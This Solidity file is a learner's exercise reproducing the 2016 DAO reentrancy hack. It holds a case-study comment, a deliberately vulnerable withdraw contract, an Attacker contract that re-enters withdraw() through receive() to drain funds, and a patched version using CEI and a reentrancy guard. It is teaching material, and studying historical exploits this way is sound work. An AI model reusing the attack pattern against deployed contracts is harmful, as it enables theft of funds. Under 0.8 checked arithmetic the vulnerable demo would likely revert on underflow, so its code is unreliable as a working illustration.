// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;


/*

i wrote the first like case study and gave it to ai and to make it polish and to make it like better 
and it gave me this so i asked to make it proffessional and shit so i wrote it and ai make it better okay
so like this like casestudy like the note is like edited and modifed by ai okay i want to admit that and i 
did what i do best okay.

================================================================================
  TIER 4 EXERCISE 5 — THE DAO HACK (June 17, 2016): A Reentrancy Case Study
================================================================================

WHAT HAPPENED
-------------
In April 2016, "The DAO" (Decentralized Autonomous Organization) launched as a
venture capital fund governed entirely by smart contracts on Ethereum. It raised
approximately $150 million worth of ETH in a token sale — the largest
crowdfunding campaign in history at that time.

On June 17, 2016, an unknown attacker exploited a reentrancy vulnerability in
The DAO's `splitDAO()` function and drained roughly 3.64 million ETH, valued at
approximately $60 million USD. The stolen funds were moved into a "child DAO"
where they were locked for 28 days due to DAO withdrawal rules, creating a
narrow window for the community to respond.

THE HARD FORK & THE ETH / ETC SPLIT
------------------------------------
On July 20, 2016, the Ethereum community executed a controversial hard fork at
block 1,920,000. The fork rolled the blockchain state back to before the exploit
and returned the stolen funds to a recovery contract where original investors
could reclaim their ETH.

A minority of miners and node operators refused the upgrade, believing that
"code is law" and that blockchain immutability should not be overridden by
social consensus. They continued mining the original, unforked chain, which
became Ethereum Classic (ETC). The upgraded chain became the dominant Ethereum
(ETH) used today.

WHY THE BUG EXISTED
-------------------
The DAO's withdrawal logic followed this dangerous pattern:

    1. Send ETH to the user via an external call
    2. Update the user's internal balance

In 2016, the Solidity compiler and developer community had not yet internalized
that any external call to an untrusted address hands over control flow to
potentially malicious code. The attacker deployed a contract whose fallback/
receive function simply called `withdraw()` again — before the DAO ever deducted
the attacker's balance. This created a recursive loop that drained the contract.

WHY THIS CHANGED EVERYTHING
---------------------------
This single incident is the direct reason two defensive patterns became
mandatory across the entire smart contract industry:

  • CEI (Checks-Effects-Interactions): Update all state (Effects) BEFORE making
    any external calls (Interactions).

  • ReentrancyGuard: A mutex lock that prevents recursive re-entry into a
    function, providing a safety net even if CEI is missed or bypassed.

Every modern audit checklist starts here. Every security researcher is expected
to spot this pattern on sight. The DAO hack is the $60 million lesson that
taught the industry why security patterns exist, not just how to apply them.
================================================================================
*/



/*

Tier 4 Exercise 5 — Reproduce a Historical Exploit

Real world context: This is what separates people who "know Solidity" from people who think like auditors. Real security researchers study past exploits obsessively — not to copy them, but to internalize the failure patterns so they recognize them instantly in new code.

The exploit: The DAO Hack (2016) — the original reentrancy attack

You already built a reentrancy exercise back in Tier 2, so the mechanism itself won't be new. This time the goal is different: reproduce it as a complete, documented case study — vulnerable contract, exploit contract, a written explanation of the real-world impact, and the fix — as if you were writing it up for a portfolio or a blog post.

What to build:

1. TheDAO_Vulnerable — a simplified version of the actual DAO's vulnerable withdraw pattern:

Users deposit ETH, tracked in a balance mapping
A withdraw() function that sends ETH via a low-level call before updating the balance (the exact real-world bug)

2. Attacker — the exploit contract:

Deposits into the vulnerable contract
Calls withdraw()
Uses receive() to re-enter withdraw() repeatedly before the balance updates, draining funds

3. TheDAO_Fixed — the patched version using CEI + a reentrancy guard

What's different this time — the write-up:

Since this is your portfolio-closing exercise for the whole roadmap, write a short markdown-style summary as a comment block at the top, covering:

What actually happened in June 2016 — roughly $60M in ETH drained, leading to Ethereum's contentious hard fork that created ETH and ETH Classic as separate chains
Why the bug existed — what pattern the original Solidity compiler/community didn't yet treat as dangerous
Why this specific incident is the reason ReentrancyGuard and the CEI pattern became mandatory practice industry-wide

You can research the real numbers and timeline — that part should be factually accurate, not just recalled from memory.

Since you already know how to build the mechanism itself, spend real time on the research and the write-up quality here. This exercise is meant to end up being the piece you'd actually show someone to prove you understand why security patterns exist, not just how to apply them.

Go.

*/

/*
	okay lets start this is the last exercise for this phase.

	i am ordered to build three contracts the vunrable contract, the attacker contract and the fixed contract.
	so like just to show i can't write the whole contract like all of it like the whole dao so i am just gonna write a simple one okay
	so i will do that then i will write the attacker contract and the fixed contract and i will do the talking shit okay.

	lets start.


*/

error NotEnough();
error NotOwner();

contract TheDAO_Vulnerable {
	mapping(address => uint256) public balances;

	function deposit() payable public {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        if(balances[msg.sender] < amount) revert NotEnough();

        (bool success, ) = msg.sender.call{value: amount}(""); 
        require(success, "failed transaction");

        balances[msg.sender] -= amount; 
    }

    function getBalance() public view returns(uint256) {
    	return address(this).balance;
    }
}


contract Attacker {
	TheDAO_Vulnerable public target; 
	uint256 public amountToWithdraw = 1 ether; 
	uint256 public whenToStop = 3640000 ether;

	address private owner; 

    constructor(address _target) {
        target = TheDAO_Vulnerable(_target);
        owner = msg.sender;

    }

    function exploitDeposit() external payable {
    	target.deposit{value: msg.value}();
	}

    function attack() external payable {
    	 require(msg.value >= amountToWithdraw, "Send ETH");
    	target.deposit{value: amountToWithdraw}();
    	target.withdraw(amountToWithdraw);
    }

    receive() external payable {
        if (address(target).balance >= amountToWithdraw) {
        	target.withdraw(amountToWithdraw);
    	}
    }

    function collect(address _to) public {
    	if(owner != msg.sender) revert NotOwner();

    	(bool success, ) = payable(_to).call{value : address(this).balance}("");
    	require(success , "transfer failed");
    }
}

contract TheDAO_Fixed {
	mapping(address => uint256) public balances;

	uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    uint256 private status;

	modifier nonReentrant() {
		require(status == NOT_ENTERED, "IT IS REENTERING");

		status = ENTERED;

		_;

		status = NOT_ENTERED;
	}

	constructor() {
		status = NOT_ENTERED;
	}

	function deposit() payable public {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public nonReentrant {
        if(balances[msg.sender] < amount) revert NotEnough();

        balances[msg.sender] -= amount; 

        (bool success, ) = msg.sender.call{value: amount}(""); 
        require(success, "failed transaction");
    }

    function getBalance() public view returns(uint256) {
    	return address(this).balance;
    }
}